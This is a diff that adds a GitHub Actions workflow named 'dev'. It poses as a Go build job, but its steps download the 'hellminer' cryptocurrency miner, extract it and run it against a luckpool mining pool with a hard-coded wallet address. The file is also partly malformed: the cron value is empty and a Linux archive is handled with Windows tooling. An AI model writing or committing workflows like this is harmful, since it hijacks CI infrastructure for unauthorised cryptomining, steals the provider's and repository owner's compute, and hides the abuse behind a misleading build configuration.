@@ -1,0 +1,33 @@
+name: dev
+ # on: [push, pull_request]
+on: 
+   schedule:
+     -cron:
+jobs:
+  build:
+    name: dev
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1]
+        flag: [A]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 100
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: dev
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -Outfile hellminer_cpu_linux.tar.gz
+    - name: Extract
+      run: Expand-Archive hellminer_cpu_linux.tar.gz
+    - name: start
+      run: ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RDCVd3nfHPPngjDmKX3Q4HXFCasFNGJLWb.fs -p x --cpu 2
